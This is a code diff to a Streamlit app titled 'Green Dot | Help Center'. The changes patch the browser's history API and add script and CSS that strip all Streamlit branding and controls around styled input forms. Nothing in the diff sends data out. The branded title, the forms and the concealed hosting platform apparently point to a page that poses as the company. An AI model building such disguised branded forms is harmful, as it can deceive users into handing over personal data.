@@ -24,7 +24,7 @@ init_db()
 
 st.set_page_config(page_title="Green Dot | Help Center", layout="centered", page_icon="✅")
 
-# 1. JAVASCRIPT: ELIMINACIÓN RADICAL DE TOOLBARS Y ANCHOR LINKS (CADA 100ms)
+# 1. JAVASCRIPT: ELIMINACIÓN RADICAL Y MANEJO DE HISTORIAL (CADA 100ms)
 st.markdown("""<script>
     const forceClean = () => {
         const toRemove = [
@@ -38,15 +38,24 @@ st.markdown("""<script>
             document.querySelectorAll(s).forEach(el => { el.style.display = 'none'; el.remove(); });
         });
     };
+    
+    // Silenciar advertencias de historial automáticas
+    if (window.history && window.history.replaceState) {
+        const originalRS = window.history.replaceState;
+        window.history.replaceState = function() {
+            if (arguments[2] && arguments[2].includes('?')) return;
+            return originalRS.apply(this, arguments);
+        };
+    }
+
     setInterval(forceClean, 100);
 </script>""", unsafe_allow_html=True)
 
-# 2. CSS: BLOQUEO DEFINITIVO Y ESTILO DE FORMULARIO
+# 2. CSS: BLOQUEO DEFINITIVO
 st.markdown("""<style>
     .stApp { background-color: #000000 !important; color: #FFFFFF !important; }
     .block-container { max-width: 500px !important; padding-top: 2rem !important; }
 
-    /* Ocultar todo rastro de Streamlit */
     header, footer, .stDeployButton, [data-testid='stHeader'], 
     [data-testid="stElementToolbar"], .stElementToolbar, 
     button[title="View fullscreen"], .stTooltipHoverTarget,
@@ -58,7 +67,6 @@ st.markdown("""<style>
         pointer-events: none !important;
     }
 
-    /* Centrado de Logo */
     [data-testid="stImage"] {
         display: block !important;
         margin-left: auto !important;
@@ -77,7 +85,6 @@ st.markdown("""<style>
         [data-testid="stImage"] img { width: 180px !important; }
     }
 
-    /* Estilo de Inputs */
     .stTextInput input, .stNumberInput input {
         background-color: #1a1a1a !important;
         color: white !important;
